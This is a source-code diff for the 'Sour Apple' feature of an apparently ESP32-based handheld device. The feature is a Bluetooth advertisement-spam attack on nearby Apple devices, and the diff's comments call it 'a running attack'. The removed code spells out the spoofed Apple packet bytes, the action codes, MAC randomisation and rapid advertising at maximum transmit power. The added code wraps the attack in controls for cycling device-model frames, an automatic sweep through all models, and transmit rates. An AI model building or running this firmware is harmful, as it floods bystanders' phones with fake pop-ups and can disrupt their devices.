-  updatedisplay();
+
+  s_running = true;
+  s_txCount = 0;
+  s_lastFieldMs = 0;
+  s_advConfigured = false;
+  updateInfoFields(true);
+  updateNavLabels();
+  logLine("[+] Sour Apple live", ORANGE);
+
+  rotateAdvertising();
+  updateInfoFields(true);
 }
 
-void displayAdvertisementData() {
-  String lineStr = String(lineNumber) + " -> ";
-  lineNumber++;
-
-  String dataStr = "0x";
-  dataStr += String(packet[1], HEX);
-
-  dataStr += ",0x";
-  dataStr += String(packet[2], HEX);
-  dataStr += String(packet[3], HEX);
-
-  dataStr += ",0x";
-  dataStr += String(packet[7], HEX);
-
-  addLineToDisplay(lineStr + dataStr);
-
+static void stopAdvertising() {
+  stopRadio();
+  s_running = false;
+  updateInfoFields(true);
+  updateNavLabels();
+  logLine("[*] Stopped", UI_DIM_TEXT);
 }
 
-BLEAdvertisementData getOAdvertisementData() {
-  BLEAdvertisementData advertisementData = BLEAdvertisementData();
-  uint8_t i = 0;
+// Pick the next/previous frame variant. The change lands on the next rotation,
+// so a running attack switches frame within a second.
+static void selectVariant(int delta) {
+  const int n = (int)kVariantCount;
+  s_variantIndex = (uint8_t)(((int)s_variantIndex + delta + n) % n);
+  if (kVariants[s_variantIndex].builder == bAuto) {
+    // Restart the sweep from the top of the interleaved pool.
+    s_autoItem = 0;
+  }
+  buildSourPacket();
+  updateInfoFields(true);
 
-  packet[i++] = 17 - 1;
-  packet[i++] = 0xFF;
-  packet[i++] = 0x4C;
-  packet[i++] = 0x00;
-  packet[i++] = 0x0F;
-  packet[i++] = 0x05;
-  packet[i++] = 0xC1;
-  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-  packet[i++] = types[rand() % sizeof(types)];
-  esp_fill_random(&packet[i], 3);
-  i += 3;
-  packet[i++] = 0x00;
-  packet[i++] = 0x00;
-  packet[i++] =  0x10;
-  esp_fill_random(&packet[i], 3);
+  char line[40];
+  snprintf(line, sizeof(line), "[*] Frame -> %s", kVariants[s_variantIndex].name);
+  logLine(line, ORANGE);
+}
 
-  advertisementData.addData(std::string((char *)packet, 17));
-  return advertisementData;
+// Pick the next hold time. The change starts counting from now, so a running
+// attack reports the new rate within one rotation either way.
+static void selectRate(int delta) {
+  const int n = (int)kRateCount;
+  s_rateIndex = (uint8_t)(((int)s_rateIndex + delta + n) % n);
+  s_lastRotateMs = millis();
+  updateInfoFields(true);
+
+  const uint16_t pool = currentPoolSize();
+  const unsigned long rateS = (unsigned long)kRatesMs[s_rateIndex] / 1000UL;
+  char line[40];
+  snprintf(line, sizeof(line), "[*] Rate %lus, cycle %lus", rateS,
+           rateS * (unsigned long)(pool ? pool : 1));
+  logLine(line, ORANGE);
+}
+
+static void handleButtons() {
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < kBtnDebounceMs) {
+    // Keep the edge detector current during the lockout so a quick second
+    // press is still counted once, not twice.
+    (void)isButtonPressedEdge(BTN_SELECT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    return;
+  }
+
+  // SELECT is Start/Stop. LEFT is the universal Exit and is handled as a
+  // level check at the top of sourappleLoop(). UP/DOWN walk the frame
+  // variants and RIGHT cycles the hold time, so each setting can be judged on
+  // the phone on its own.
+  if (isButtonPressedEdge(BTN_SELECT)) {
+    s_lastBtnMs = now;
+    if (s_running) {
+      stopAdvertising();
+    } else {
+      startAdvertising();
+    }
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_DOWN)) {
+    s_lastBtnMs = now;
+    selectVariant(1);
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_UP)) {
+    s_lastBtnMs = now;
+    selectVariant(-1);
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_RIGHT)) {
+    s_lastBtnMs = now;
+    selectRate(1);
+    return;
+  }
+}
+
+static void teardown() {
+  stopRadio();
+  s_running = false;
+  s_advConfigured = false;
 }
 
 void sourappleSetup() {
   if (!bleRequireStackOrExit()) return;
+  pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
-  bleSetExitOnlyNavLabels();
   bleClearBody(TFT_BLACK);
-
-  float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, true);
-  redrawTouchButtonBar();
-
-  tft.setTextSize(1);
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
-  uiDrawn = false;
-
   setupTouchscreen();
 
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  s_uiDrawn = false;
+  s_staticDrawn = false;
+  s_running = false;
+  s_advConfigured = false;
+  s_addrIsRandom = false;
+  s_txCount = 0;
+  s_variantIndex = 0;
+  s_activeBuilder = bAudioTag;
+  s_activeCode = 0;
+  s_activeName = "AirTag";
+  s_activeFamilyName = "aud tag";
+  s_autoItem = 0;
+  s_rateIndex = kDefaultRateIndex;
+  s_logCount = 0;
+  s_lastBtnMs = 0;
+  s_lastRotateMs = 0;
+  s_lastFieldMs = 0;
+  s_lastLogMs = 0;
+  s_lastSerialMs = 0;
+  s_cacheState[0] = '\0';
+  s_cacheMac[0] = '\0';
+  s_cacheFrame[0] = '\0';
+  s_cacheAction[0] = '\0';
+  s_cacheRate[0] = '\0';
+  s_cacheTx[0] = '\0';
+  memset(s_log, 0, sizeof(s_log));
+  memset(s_dispLog, 0, sizeof(s_dispLog));
+  memset(s_dispColor, 0, sizeof(s_dispColor));
+  memset(s_mac, 0, sizeof(s_mac));
 
+  randomSeed(esp_random());
+  buildSourPacket();
+
+  // Never inherit a running radio from a previous visit.
+  ensureAdvertising();
+  stopRadio();
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  runUI();
+  updateNavLabels();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);
 
-  BLEServer *pServer = BLEDevice::createServer();
-  Advertising = pServer->getAdvertising();
-  redrawTouchButtonBar();
+  updateInfoFields(true);
+  logLine("[*] Ready - Select = Start", ORANGE);
+  logLine("[*] Auto: all models in turn", UI_DIM_TEXT);
+  logLine("[*] Right = rate, close prompts", UI_DIM_TEXT);
 }
 
 void sourappleLoop() {
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
 
-  // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
-  // This feature has no other action.
+  // LEFT is the universal Exit. Tested as a level (not an edge) and first
+  // thing on every pass, so a single press is caught within a few
+  // milliseconds: this loop never blocks on the radio nor on a repaint.
   if (feature_active && isButtonPressed(BTN_LEFT)) {
+    teardown();
     feature_exit_requested = true;
     return;
   }
 
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  handleButtons();
   runUI();
+  updateStatusBar();
+  maintainTouchNavBar();
 
-  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-  for (int i = 0; i < 6; i++) {
-    dummy_addr[i] = random(256);
-    if (i == 0) {
-      dummy_addr[i] |= 0xF0;
+  if (s_running) {
+    const unsigned long now = millis();
+    if (s_lastRotateMs == 0 ||
+        (uint32_t)(now - s_lastRotateMs) >= (uint32_t)kRatesMs[s_rateIndex]) {
+      rotateAdvertising();
+    }
+    if ((uint32_t)(now - s_lastFieldMs) >= kFieldMs) {
+      s_lastFieldMs = now;
+      updateInfoFields(false);
     }
   }
-  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();
 
-  Advertising->addServiceUUID(device_uuid);
-  Advertising->setAdvertisementData(oAdvertisementData);
-
-  Advertising->setMinInterval(0x20);
-  Advertising->setMaxInterval(0x20);
-  Advertising->setMinPreferred(0x20);
-  Advertising->setMaxPreferred(0x20);
-
-  Advertising->start();
-
-  delay(40);
-  displayAdvertisementData();
+  if (feature_exit_requested) {
+    teardown();
+  }
 }
 
 void exit() {
-
-  if (Advertising) {
-    Advertising->stop();
-  }
+  teardown();
 }
 }
 
